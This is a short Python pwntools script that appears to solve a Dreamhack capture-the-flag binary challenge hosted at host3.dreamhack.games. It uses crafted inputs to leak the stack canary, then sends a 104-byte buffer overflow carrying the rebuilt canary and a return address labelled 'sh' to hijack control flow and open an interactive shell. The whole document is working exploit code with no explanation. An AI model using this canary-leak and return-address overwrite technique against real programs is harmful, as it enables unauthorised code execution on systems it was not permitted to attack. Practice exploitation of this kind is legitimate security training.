from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 14792
r = remote(HOST, PORT)

sh=0x401216
r.sendlineafter(b'name: ', b'A'*56)
r.sendlineafter(b'age: ', f'{0xffffffff}'.encode())
r.sendlineafter(b'height: ', f'{1.1111111111}'.encode())
r.sendafter(b'): ', b'Femal')
r.recvuntil(b'emal')

canary=u64(r.recvline().strip(b'.\n')[:7].ljust(8,b'\x00')) << 8
r.sendafter(b'? ', b'A'*104 + p64(canary) + p64(0) + p64(sh))

r.interactive()